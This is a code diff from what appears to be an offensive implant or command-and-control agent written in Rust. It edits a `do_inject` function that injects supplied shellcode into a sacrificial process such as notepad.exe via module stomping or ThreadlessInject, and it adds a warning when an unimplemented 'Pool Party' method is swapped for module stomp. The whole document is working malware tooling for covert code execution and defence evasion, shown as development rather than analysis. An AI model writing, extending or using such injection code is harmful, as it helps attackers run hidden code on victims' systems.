@@ -678,16 +678,35 @@ pub unsafe fn threadless_inject(
 ///   sacrificial process (spawn_to) for the main-thread handle.
 /// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
 ///
-/// If `pid != 0`, the shellcode is injected into an EXISTING process (method 0
-/// only — Pool Party targets a running process's thread pool). Otherwise a
-/// sacrificial process is spawned (spawn_to, default "notepad.exe").
+/// **Methods:**
+/// - `0` — Pool Party (thread-pool section-backed). **Not yet implemented**;
+///   silently falls back to method 2 (module stomp) with a warning prefix so
+///   the operator knows the requested technique was substituted.
+/// - `1` — ThreadlessInject HWBP (sacrificial process).
+/// - `2` — Module Stomp (.text overwrite in a sacrificial process).
+///
+/// `pid` is accepted for forward-compatibility (Pool Party / remote-inject
+/// paths) but is currently unused — all implemented methods spawn a fresh
+/// sacrificial process via `spawn_to` (default `notepad.exe`).
 ///
 /// Returns a `Response::Output` with a status line, or `Response::Err`.
 pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
+    let _ = pid; // forward-compat: Pool Party / remote-inject will use this.
+
     // method 0 (Pool Party) not yet implemented — delegate to module stomp
-    // (method 2) so the command works end-to-end today. When Pool Party
-    // lands, this dispatch arm gets its own path.
+    // (method 2) so the command works end-to-end today. Prefix the output so
+    // the operator is NOTIFIED that their requested technique was substituted
+    // (silent substitution is a UX hazard — they'd think they got Pool Party).
     let effective_method = if method == 0 { 2 } else { method };
+
+    // Build a warning prefix for the method-0 substitution.
+    let warn_prefix = if method == 0 {
+        crate::heap::String::from(
+            "WARN: Pool Party (method 0) not implemented — using module stomp (method 2). ",
+        )
+    } else {
+        crate::heap::String::new()
+    };
 
     match effective_method {
         1 => {
@@ -723,9 +742,12 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
                 spawn_to
             };
             match unsafe { module_stomp(target, shellcode) } {
-                Ok(_handle) => nyx_protocol::Response::Output(
-                    crate::heap::String::from("module stomp inject ok").into_bytes(),
-                ),
+                Ok(_handle) => {
+                    // Prepend the Pool-Party-substitution warning if method was 0.
+                    let mut msg = warn_prefix;
+                    msg.push_str("module stomp inject ok");
+                    nyx_protocol::Response::Output(msg.into_bytes())
+                }
                 Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
             }
         }
